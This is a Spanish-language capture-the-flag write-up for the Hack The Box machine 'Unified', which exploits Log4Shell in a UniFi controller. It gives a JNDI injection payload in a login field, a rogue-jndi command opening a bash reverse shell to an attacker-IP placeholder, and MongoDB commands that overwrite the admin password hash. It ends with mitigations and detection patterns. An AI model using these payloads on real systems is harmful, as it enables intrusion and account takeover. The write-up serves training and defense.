---
machine: Unified
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [log4shell, unifi, mongodb, linux, tier2]
---

# Unified — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available · Starting Point · Tier 2 · Linux · Very Easy

## TL;DR

UniFi Network **6.4.54** en **8443/tcp** es vulnerable a **Log4Shell** (CVE-2021-44228) a través del parámetro `remember` del login. Con `rogue-jndi` se obtiene shell como `unifi`; el MongoDB local (27117) guarda el hash del administrador y, tras cambiarlo, se entra en la consola UniFi y se lee la flag de root.

---

## Reconocimiento

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
22/tcp   ssh
8080/tcp http   UniFi
8443/tcp ssl/http UniFi Network 6.4.54
```

- 8443 es la interfaz de gestión; 8080 redirige.
- La versión 6.4.54 incluye Log4j 2.x vulnerable.

## Enumeración

```bash
curl -sk https://<TARGET_IP>:8443/status
```

Se confirma el producto y la versión. El login envía `remember=<valor>` al endpoint `/api/login`, y ese valor acaba en una llamada `log4j`:

```bash
curl -sk -X POST https://<TARGET_IP>:8443/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"x","password":"x","remember":"${jndi:ldap://<ATTACKER_IP>:389/a}"}'
```

## Foothold

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi && mvn package
java -jar target/RogueJndi-1.1.jar --command "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'" --hostname <ATTACKER_IP>
```

Con `nc -lvnp 4444` escuchando, se repite la petición y llega la shell:

```text
unifi@unified:/usr/lib/unifi$
```

## Movimiento lateral

```bash
ps aux | grep mongo
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson)"
```

```text
{ "_id": ..., "name": "administrator", "x_shadow": "<HASH>" }
```

El hash está en formato `sha512` con sal; se genera uno nuevo y se actualiza:

```bash
mongo --port 27117 ace --eval 'db.admin.update({name:"administrator"},{$set:{x_shadow:"<NUEVO_HASH>"}})'
```

## Escalada de privilegios

Con la contraseña nueva se entra en `https://<TARGET_IP>:8443` como `administrator`. Desde la consola de UniFi se obtiene la flag de root; la de usuario está en `/home/michael/user.txt`.

- No hay escalada de sistema: el control es administrativo sobre la aplicación.

## Evidencia

- Respuesta de `/status` con la versión.
- Consulta a Mongo con el hash redactado.

## Lecciones aprendidas

- Log4Shell sigue vivo en appliances sin parchear: un campo «remember» basta.
- `tcpdump -i tun0 port 389` confirma la llamada JNDI antes de montar el LDAP.
- Los appliances embeben MongoDB en puertos no estándar (27117) y con credenciales por defecto.
- Cambiar el hash en la base es una forma limpia de tomar la aplicación sin romperla.

## Mitigaciones y detección

- Actualizar UniFi y Log4j; `log4j2.formatMsgNoLookups=true` como parche temporal.
- Bloquear salidas LDAP/RMI desde el appliance.
- MongoDB en loopback con autenticación y sin credenciales por defecto.
- Detección: `${jndi:` en logs, conexiones salientes al 389/1389, procesos `java` con hijos `bash`.

- CVE-2021-44228
- CWE-502, CWE-94
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1059.004](https://attack.mitre.org/techniques/T1059/004/)

## Referencias

- [NVD — CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [rogue-jndi](https://github.com/veracode-research/rogue-jndi)
